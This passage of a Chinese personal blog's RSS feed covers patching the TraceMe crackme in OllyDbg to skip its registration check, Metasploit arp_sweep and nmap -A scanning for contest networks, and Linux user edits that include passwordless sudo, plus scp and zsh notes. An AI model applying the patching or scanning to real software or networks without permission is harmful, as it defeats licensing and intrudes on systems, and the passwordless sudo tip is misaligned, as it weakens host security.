&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Fri, 26 Jul 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019/07/26/%E5%AE%9E%E9%AA%8C%E5%90%A7ROPbaby(PWN)/</link>
        <guid isPermaLink="true">http://localhost:4000/2019/07/26/%E5%AE%9E%E9%AA%8C%E5%90%A7ROPbaby(PWN)/</guid>
        
        <category>CTF</category>
        
        <category>PWN</category>
        
        <category>Notes</category>
        
        
      </item>
    
      <item>
        <title>调试破解TraceMe</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;本文首发于博主公众号LISTONE，欢迎关注哦！&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;调试破解traceme&quot;&gt;调试破解TraceMe&lt;/h1&gt;

&lt;h2 id=&quot;一&quot;&gt;（一）&lt;/h2&gt;
&lt;p&gt;运行程序，界面为：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://wx3.sinaimg.cn/large/007cEDWily1g54glf7jh1j309405o74c.jpg&quot; alt=&quot;TraceMe01&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们随便输入点东西观察一下，如果输入错误会弹出错误框。
&lt;img src=&quot;http://wx3.sinaimg.cn/large/007cEDWily1g54glpab4wj309405o0su.jpg&quot; alt=&quot;TraceMe01a&quot; /&gt;&lt;/p&gt;

&lt;p&gt;观察一下程序，有两个输入框，这个在后面调试会用到。&lt;/p&gt;

&lt;h2 id=&quot;二&quot;&gt;（二）&lt;/h2&gt;
&lt;p&gt;打开要调试的程序，光标停在004013A0h处，004013A0h处为程序的入口点（EntryPoint），如下图&lt;br /&gt;
&lt;img src=&quot;http://wx4.sinaimg.cn/large/007cEDWily1g54glsa0ekj30et02rwef.jpg&quot; alt=&quot;TraceMe02&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在调试程序的时候，合理运用断点进行调试，可以在很大程度上加快程序调试的速度。前面观察，这个程序有两个输入框，那么有输入，程序必然需要从输入框中读取字符，而读取字符通常使用使用的API是GetDlgItemText或者GetWindowText函数，也可以发送消息直接获取文本框中的文本。&lt;br /&gt;
在一般情况下，我们是没有办法直接知道程序用了什么函数来处理字符，所以需要我们多进行尝试。&lt;/p&gt;

&lt;p&gt;我们在OllyDbg中下一个断点，有快捷键Ctrl+G，可以打开一个跟随表达式窗口，如图，输入GetDlgItemTextA，回车跳转。&lt;br /&gt;
&lt;img src=&quot;http://wx2.sinaimg.cn/large/007cEDWily1g54glvjdazj3095030q2u.jpg&quot; alt=&quot;TraceMe03&quot; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;注意：OD对大小写敏感，所以大小写不能写错。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;这时会跳转到74FF6BCEh，GetDlgItemTextA函数的入口点。在这里按一下F2可以下一个断点。&lt;br /&gt;
&lt;img src=&quot;http://wx1.sinaimg.cn/large/007cEDWily1g54glxzrjxj30hn03v3yi.jpg&quot; alt=&quot;TraceMe04&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后让程序跑起来输入数据之后，它会断在我们刚才下断点的地方，之后我们单步执行（按F8），刚才下断点的地方会执行两次，因为我们的程序有两个输入框。一般API函数都服从__stdcall调用约定，即函数入口参数按从左到右的顺序入栈，由被调用者清理栈中的参数，返回值放在eax寄存器中。OD真的很强大，它把GetDlgItemTextA函数的参数识别并列在右边，如下图。&lt;br /&gt;
&lt;img src=&quot;http://wx3.sinaimg.cn/large/007cEDWily1g54gm0p60sj30pm05i74l.jpg&quot; alt=&quot;TraceMe05&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;push edx&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;push eax&lt;/code&gt;将我输入的listone和123123入栈。在栈空间栈顶可以看到输入的数据。&lt;br /&gt;
&lt;img src=&quot;http://wx3.sinaimg.cn/large/007cEDWily1g54gm3g8ekj30rv03xdg4.jpg&quot; alt=&quot;TraceMe06&quot; /&gt;
&lt;img src=&quot;http://wx1.sinaimg.cn/large/007cEDWily1g54gm67sw2j309d03ldfs.jpg&quot; alt=&quot;TraceMe07&quot; /&gt;&lt;/p&gt;

&lt;p&gt;继续向下执行可以看到这里有一个判断，eax=0表示注册失败，eax=1表示注册成功，下面的跳转语句，若不跳转表示成功。&lt;br /&gt;
&lt;img src=&quot;http://wx4.sinaimg.cn/large/007cEDWily1g54gm93n3fj30h60460st.jpg&quot; alt=&quot;TraceMe08&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;三&quot;&gt;（三）&lt;/h2&gt;
&lt;p&gt;所以，我们可以让其跳转失效，有两种方法，第一种是将标志寄存器zf标志位由1变为0就可以了，但是这种方法有个问题就是没有办法保存，下次运行就会失效，第二种方法是将跳转语句用&lt;code class=&quot;highlighter-rouge&quot;&gt;nop&lt;/code&gt;指令填充，然后保存，所以第二种方法就显得人性化一些，可以保存破解结果，不需要重复破解，下面演示一下第二种方法：&lt;br /&gt;
将跳转指令用nop填充：&lt;br /&gt;
&lt;img src=&quot;http://wx2.sinaimg.cn/large/007cEDWily1g54gn3g3htj30lw095adb.jpg&quot; alt=&quot;TraceMe09&quot; /&gt;&lt;/p&gt;

&lt;p&gt;鼠标右键选择复制到可执行文件==&amp;gt;所有修改&lt;br /&gt;
&lt;img src=&quot;http://wx3.sinaimg.cn/large/007cEDWily1g54gn5c7t5j30c403a3yn.jpg&quot; alt=&quot;TraceMe10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在弹出的窗口中鼠标右键后选择保存文件
&lt;img src=&quot;http://wx1.sinaimg.cn/large/007cEDWily1g54gn7kdhpj30e307m74u.jpg&quot; alt=&quot;TraceMe11&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;四&quot;&gt;（四）&lt;/h2&gt;
&lt;p&gt;之后运行这个保存的文件，可以看到破解成功了&lt;br /&gt;
&lt;img src=&quot;http://wx1.sinaimg.cn/large/007cEDWily1g54gn9rxigj309405oq31.jpg&quot; alt=&quot;TraceMe12&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Fri, 19 Jul 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019/07/19/%E8%B0%83%E8%AF%95%E7%A0%B4%E8%A7%A3TraceMe/</link>
        <guid isPermaLink="true">http://localhost:4000/2019/07/19/%E8%B0%83%E8%AF%95%E7%A0%B4%E8%A7%A3TraceMe/</guid>
        
        <category>CTF</category>
        
        <category>Reverce</category>
        
        <category>破解</category>
        
        <category>Notes</category>
        
        
      </item>
    
      <item>
        <title>linux更改用户名以及sudo用户小技巧</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;本文首发于博主公众号LISTONE，欢迎关注哦！&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;  &lt;strong&gt;一、&lt;/strong&gt; 历时几天，终于下完了一个3.4G大小的一个ubuntu虚拟机压缩包（百度云限速，本人穷，买不起会员。。。），这个虚拟机是前人搭建好的一个pwn做题环境，它的默认名字是他平时的代号，这个就让我很不舒服了，虽然是现成的，但谁不想看着自己的名字不是，所以一气之下，决定删除用户，但是转念一想，他就是在这个用户下配置的环境，我删了，那配的环境不也就没有了，所以我就想着改一下用户名，在这期间有很多要改的地方，如果不小心操作错误，很有可能会无法登录系统，所以我在这里记录一下我的解决方法，免得以后踩坑。。。&lt;br /&gt;
  &lt;strong&gt;二、&lt;/strong&gt; 我的主机操作系统被我换成kali了，当初想着root用户不安全，遂建立了一个普通用户，可是建立普通用户之后也发现，坑！太坑了！不输入sudo执行命令，很多命令都执行不了，而每次执行sudo命令时，都要输入当前用户密码，这就让我特别难受了。自认为密码长了就会安全，所以我给普通用户设置了一个15位长的密码，这每次执行命令的时候输一遍，谁顶得住，太麻烦了呀，于是想办法解决，功夫不负有心人，这个方法被我找到了，哈哈哈。。。
  行，闲话扯皮完毕，下面进入正题。。。&lt;/p&gt;

&lt;h2 id=&quot;linux更改用户名&quot;&gt;linux更改用户名&lt;/h2&gt;
&lt;h3 id=&quot;一修改sudoer文件&quot;&gt;（一）修改sudoer文件&lt;/h3&gt;
&lt;p&gt;  我们为自己要改的名字提前赋予较高的权限，防止修改下面文件的过程中出现权限不足。（注：之前这个ubuntu用户名不是listone，我平时自己的代号是listone，所以我已经改过来了，当时修改的时候没有截图，那我就假设有一个aaa用户，我要将aaa用户名改为listone用户名）
&lt;img src=&quot;http://wx1.sinaimg.cn/large/007cEDWily1g50kqajt7uj30bl01mjrb.jpg&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;http://wx3.sinaimg.cn/large/007cEDWily1g50kpo69n7j30ak027glu.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;二修改shadow文件&quot;&gt;（二）修改shadow文件&lt;/h3&gt;
&lt;p&gt;  这个文件中存储与登陆有关的内容格式如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username: passwd: lastchg: min: max: warn: inactive: expire: flag   
登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;http://wx2.sinaimg.cn/large/007cEDWily1g50kplsn5oj30au018dg1.jpg&quot; alt=&quot;&quot; /&gt;
  我们需要将登录名更改：
&lt;img src=&quot;http://wx4.sinaimg.cn/large/007cEDWily1g50kpjko9vj30bs017wep.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;三开始修改目录&quot;&gt;（三）开始修改目录&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;http://wx3.sinaimg.cn/large/007cEDWily1g50kph2bu6j30b101cjrb.jpg&quot; alt=&quot;&quot; /&gt;
  用户开始目录中，包含用户相关配置信息，我们要将二者相匹配&lt;/p&gt;

&lt;h3 id=&quot;四修改passwd文件&quot;&gt;（四）修改passwd文件&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;http://wx3.sinaimg.cn/large/007cEDWily1g50kpe77llj30bm01gdfs.jpg&quot; alt=&quot;&quot; /&gt;
  passwd文件内容格式如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;用户名: 密码 : uid  : gid :用户描述：主目录：登陆shell
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;http://wx3.sinaimg.cn/large/007cEDWily1g50koxxp63j30c601maad.jpg&quot; alt=&quot;&quot; /&gt;
  我们将用户名，以及主目录等等改为新的名字
&lt;img src=&quot;http://wx1.sinaimg.cn/large/007cEDWily1g50kpbx41rj30dx01bdg8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3 id=&quot;五如果还想修改原来用户下文件所属的组&quot;&gt;（五）如果还想修改原来用户下文件所属的组：&lt;/h3&gt;
&lt;p&gt;  可以将 /etc/group 文件中的旧用户组，改为新的用户组&lt;/p&gt;
&lt;h3 id=&quot;六最后再次进入etcsudoer-文件将就用户名aaa-删除&quot;&gt;（六）最后，再次进入/etc/sudoer 文件，将就用户名aaa 删除&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;http://wx1.sinaimg.cn/large/007cEDWily1g50kovmzzhj30b001r74g.jpg&quot; alt=&quot;&quot; /&gt;
  最后，重启之后就可以看到用户名已经更改。&lt;/p&gt;

&lt;h2 id=&quot;sudo用户小技巧&quot;&gt;sudo用户小技巧&lt;/h2&gt;
&lt;p&gt;  使用sudo用户时，可以修改sudoer文件，认真的同学，应该在上面已经发现了技巧，现在，在这里重提一下。
&lt;img src=&quot;http://wx2.sinaimg.cn/large/007cEDWily1g50kopephcj309g01w74j.jpg&quot; alt=&quot;&quot; /&gt;
  就是在listone用户那里，加一个NOPASSWD就行了，比起修改用户名来说，很简单了。&lt;/p&gt;

&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;  linux零碎的知识很多，在学习过程中，记录是很重要的，以前学到的东西，因为没有记录，当要用到的时候又给忘掉了，还要重新找资料，所以不如我们平时学习的时候多记笔记，多反思。
  嗯，就是这样，这次分享就到这里了。&lt;/p&gt;
</description>
        <pubDate>Mon, 15 Jul 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019/07/15/linux%E6%9B%B4%E6%94%B9%E7%94%A8%E6%88%B7%E5%90%8D%E4%BB%A5%E5%8F%8Asudo%E7%94%A8%E6%88%B7%E5%B0%8F%E6%8A%80%E5%B7%A7/</link>
        <guid isPermaLink="true">http://localhost:4000/2019/07/15/linux%E6%9B%B4%E6%94%B9%E7%94%A8%E6%88%B7%E5%90%8D%E4%BB%A5%E5%8F%8Asudo%E7%94%A8%E6%88%B7%E5%B0%8F%E6%8A%80%E5%B7%A7/</guid>
        
        <category>linux</category>
        
        <category>Notes</category>
        
        
      </item>
    
      <item>
        <title>MSF内网探测及nmap新学用法</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;本文首发于博主公众号LISTONE，欢迎关注哦！&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;线下赛awd比赛的时候，有时候主办方不提供每个参赛队的IP地址，所以，我们需要自己去发现主机。&lt;/p&gt;

&lt;p&gt;之前我学过nmap，好久没用了，今天用的时候，尴尬的发现自己忘了好多nmap的命令了，看来知识需要多记、多积累，记忆真的敌不过时间。&lt;/p&gt;

&lt;p&gt;然后，我就发现了msf真香，简单易用，关键速度还很快，现在简单记录一下如何使用msf进行内网探测，免得过几天就忘了。。。&lt;/p&gt;

&lt;h2 id=&quot;msf内网探测&quot;&gt;msf内网探测&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo msfconsole&lt;/code&gt; 进入Metasploit Framework
&lt;img src=&quot;http://wx2.sinaimg.cn/large/007cEDWily1g4zn45ue9cj30ek01tt96.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;search arp_sweep&lt;/code&gt; 搜索探测模块
&lt;img src=&quot;http://wx2.sinaimg.cn/large/007cEDWily1g4zn4ddjssj30qc05gwf4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;use auxiliary/scanner/discovery/arp_sweep&lt;/code&gt; 使用该模块&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;show options&lt;/code&gt; 查看设置参数
&lt;img src=&quot;http://wx4.sinaimg.cn/large/007cEDWily1g4zn4b2i3fj30nw07hwfu.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;set rhosts 172.20.101.101-172.20.130.103&lt;/code&gt; 设置目标ip地址段也可&lt;code class=&quot;highlighter-rouge&quot;&gt;172.20.102.0/24&lt;/code&gt;&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;set threads 100&lt;/code&gt; 设置线程数，线程数高，速度快，线程数小，更隐蔽
&lt;img src=&quot;http://wx3.sinaimg.cn/large/007cEDWily1g4zn48cvk1j30oi02cmxp.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;run&lt;/code&gt;设置完成，输入run进行探测&lt;/p&gt;

&lt;h2 id=&quot;nmap新学用法&quot;&gt;nmap新学用法&lt;/h2&gt;
&lt;p&gt;也算是回顾吧！毕竟我大一的时候还是系统的学过nmap的（只是好久不用，忘了，嘿嘿）。。。&lt;/p&gt;

&lt;p&gt;今天着重记的就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;-A&lt;/code&gt; 参数了。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap  -A  192.168.205.31&lt;/code&gt;  这个命令不仅列出目标主机开放的端口号，对应的服务，还较为详细的列出了服务的版本，其支持的命令,到达目标主机的每一跳路由等信息。在进行完全扫描时，扫描机与目标主机之间存在大量的数据流量交互，扫描时长随之增加。完全扫描不仅仅是TCP协议上的通信交互，还有例如ICMP、HTTP、NBSS、TDS、POP等等协议的交互，这些协议的交互是因为在完全扫描开始时首先对目标主机的开放端口进行了确认，之后再根据不同对应的不同服务进行服务版本信息探测、账户信息等信息的探测！&lt;/p&gt;

&lt;p&gt;截图就不截了吧，总之记得，很好用就是了。&lt;/p&gt;

&lt;p&gt;不过在实际环境中，用这个参数，进攻性就很强了，我是在比赛里使用的。所以也就没啥了，实际环境用，还是要慎重一些的。&lt;/p&gt;

&lt;p&gt;唉，算了，还是截个图吧，没图觉得不完整。。。
&lt;img src=&quot;http://wx4.sinaimg.cn/large/007cEDWily1g4zn42grlvj30oq0m6jwg.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 14 Jul 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019/07/14/MSF%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%E5%8F%8Anmap%E6%96%B0%E5%AD%A6%E7%94%A8%E6%B3%95/</link>
        <guid isPermaLink="true">http://localhost:4000/2019/07/14/MSF%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%E5%8F%8Anmap%E6%96%B0%E5%AD%A6%E7%94%A8%E6%B3%95/</guid>
        
        <category>MSF</category>
        
        <category>Nmap</category>
        
        <category>内网探测</category>
        
        <category>Notes</category>
        
        
      </item>
    
      <item>
        <title>SSH命令行传输文件到远程服务器</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;博主电脑系统一直用的都是kali，在linux系统中没有windows系统中可以用的Xshell工具和Xftp工具，所以我在平时用Linux自带的ssh连接上服务器之后，传输文件变成
了一个非常让人头疼的问题，最开始我使用nc来进行文件传输，后来觉得很麻烦，就想着找一个新的工具来替代nc，无意中就发现了scp这个工具，在这篇博客里简单记录
一下scp的用法。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;使用方式如下&quot;&gt;使用方式如下：&lt;/h2&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;上传本地文件到服务器&quot;&gt;上传本地文件到服务器&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scp /path/filename username@servername:/path/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;例如scp /var/www/test.php listone@192.168.205.131:/var/www/ 把本机/var/www/目录下的test.php文件上传到192.168.205.131这台服务器上的/var/www/目录中&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;从服务器上下载文件&quot;&gt;从服务器上下载文件&lt;/h3&gt;
&lt;p&gt;下载文件我们经常使用wget，但是如果没有http服务，如何从服务器上下载文件呢？&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scp username@servername:/path/filename /var/www/local_dir（本地目录）
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;例如scp listone@192.168.205.131:/var/www/test.txt 把192.168.205.131上的/var/www/test.txt 的文件下载到/var/www/local_dir（本地目录）&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;从服务器下载整个目录&quot;&gt;从服务器下载整个目录&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scp -r username@servername:/var/www/remote_dir/（远程目录） /var/www/local_dir（本地目录）
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;例如:scp -r listone@192.168.205.131:/var/www/test /var/www/&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;上传目录到服务器&quot;&gt;上传目录到服务器&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scp -r local_dir username@servername:remote_dir
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;例如：scp -r test listone@192.168.205.131:/var/www/ 把当前目录下的test目录上传到服务器的/var/www/ 目录&lt;/p&gt;
</description>
        <pubDate>Tue, 12 Feb 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019/02/12/SSH%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E5%88%B0%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/</link>
        <guid isPermaLink="true">http://localhost:4000/2019/02/12/SSH%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6%E5%88%B0%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid>
        
        <category>SSH</category>
        
        <category>SCP</category>
        
        <category>Notes</category>
        
        <category>文件传输</category>
        
        
      </item>
    
      <item>
        <title>快速配置zsh</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;比较水的 Personal Notes&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;查看你的系统有几种shell&quot;&gt;查看你的系统有几种shell&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /etc/shells
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;显示&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/bin/bash
/bin/csh
/bin/ksh
/bin/sh
/bin/tcsh
/bin/zsh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;安装-oh-my-zsh&quot;&gt;安装 oh my zsh&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone git://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh
cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;重新打开终端，输入&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zsh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;即可切换终端，并且发现 oh my zsh 已经帮我们配置好 zsh 了&lt;/p&gt;

&lt;h2 id=&quot;修改主题&quot;&gt;修改主题&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;open ~/.zshrc 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;修改 &lt;code class=&quot;highlighter-rouge&quot;&gt;ZSH_THEME=”robbyrussell”&lt;/code&gt;，主题在 ~/.oh-my-zsh/themes 目录下。
修改为&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ZSH_THEME=&quot;kolo&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以&lt;a href=&quot;https://github.com/robbyrussell/oh-my-zsh/wiki/themes&quot;&gt;参照这里&lt;/a&gt;进行选择.&lt;/p&gt;

&lt;h2 id=&quot;设置为默认shell&quot;&gt;设置为默认shell&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chsh -s /bin/zsh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;添加自定义命令&quot;&gt;添加自定义命令&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;open ~/.zshrc 添加显示隐藏文件的快捷命令

alias fd='defaults write com.apple.finder AppleShowAllFiles -boolean true ; killall Finder'
alias fh='defaults write com.apple.finder AppleShowAllFiles -boolean false ; killall Finder'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Thu, 07 Feb 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019/02/07/%E5%BF%AB%E9%80%9F%E9%85%8D%E7%BD%AEzsh/</link>
        <guid isPermaLink="true">http://localhost:4000/2019/02/07/%E5%BF%AB%E9%80%9F%E9%85%8D%E7%BD%AEzsh/</guid>
        
        <category>终端</category>
        
        <category>zsh</category>
        
        <category>Notes</category>
        
        
      </item>
    
      <item>
        <title>博客首发</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;第一次搭建自己的博客，就简单的立一些flag吧！&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;回望过去&quot;&gt;回望过去&lt;/h2&gt;
&lt;p&gt;上了大学之后，自己的写作水平一直在退步。所以就想着借着博客来提高一下自己的写作能力。2018年已经过去了，过去的一年里，收获很多，但是呢，我觉得最大的收获
就是无意间找到了一个女朋友，哈哈哈～～作为一个学IT的
人来说，找女朋友太难了，在遇见她之前，我都做好大学不找女朋友的打算了，可是在遇见她之后，真是被啪啪打脸，完全克制不住对她的喜爱，觉得世界上怎么会有这么
可爱的人儿呢Ｏ（∩＿∩）Ｏ哈哈～。学习成绩嘛，当然也是受了一些影响的，刚看到成绩时，打击还蛮大的，之后自己想了想，我都找到这么好的人儿了，还奢求那么多干嘛，
下学期再努力呗。&lt;/p&gt;

&lt;h2 id=&quot;计划一下未来&quot;&gt;计划一下未来&lt;/h2&gt;
&lt;p&gt;就不计划太远的事情了，先把眼下的事情都处理一下，最重要的应该就是要考的信息安全工程师认证考试了吧，据说这个还蛮难考的，离考试时间越来越近了，五月份就开始了，
但是感觉自己准备的还不好，看见模拟题就是两眼一抹黑，要加紧步伐去准备了。还有英语四级，单词还没背的我对这个发憷的不行，不敢想了，还是做模拟卷子吧。当然学生的天职还是学习，好好学习，把去年没学好的都给补上来。最后也是最重要的，
就是要对那个小傻子更好一些，多陪陪那个小傻子Ｏ（∩＿∩）Ｏ哈哈哈～&lt;/p&gt;

</description>
        <pubDate>Thu, 07 Feb 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019/02/07/%E5%8D%9A%E5%AE%A2%E9%A6%96%E5%8F%91/</link>
        <guid isPermaLink="true">http://localhost:4000/2019/02/07/%E5%8D%9A%E5%AE%A2%E9%A6%96%E5%8F%91/</guid>
        
        <category>生活</category>
        
        <category>感想</category>
        
        
      </item>
    
  </channel>
</rss>
